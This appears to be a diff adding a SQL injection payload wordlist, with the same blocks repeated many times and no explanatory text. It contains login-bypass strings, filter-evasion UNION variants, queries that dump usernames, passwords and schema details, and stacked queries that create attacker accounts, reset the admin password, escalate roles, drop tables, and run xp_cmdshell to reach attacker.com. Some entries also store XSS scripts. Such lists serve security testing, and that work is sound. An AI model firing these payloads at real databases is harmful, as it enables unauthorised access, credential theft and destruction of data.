@@ -1,0 +1,1820 @@
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION SELECT database(), version()--
+' UNION SELECT 1, database()--
+' UNION SELECT user(), version()--
+' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username, password FROM members--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION ALL SELECT null, username, password FROM admin--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3 WHERE 1=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
+'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; INSERT INTO logs (entry) VALUES ('<iframe src="http://attacker.com"></iframe>')--
+'; INSERT INTO profile (bio) VALUES ('<img src="javascript:alert(1)">')--
+'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--
+'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--
+'; UPDATE users SET status='active' WHERE username='banneduser'--
+'; UPDATE orders SET status='shipped' WHERE order_id=1--
+'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--
+'; UPDATE users SET password='newpassword' WHERE username='admin'--
+'; DROP TABLE logs;--
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+'; INSERT INTO comments (comment) VALUES ('<script>alert("XSS")</script>')--
+'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--
+'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--
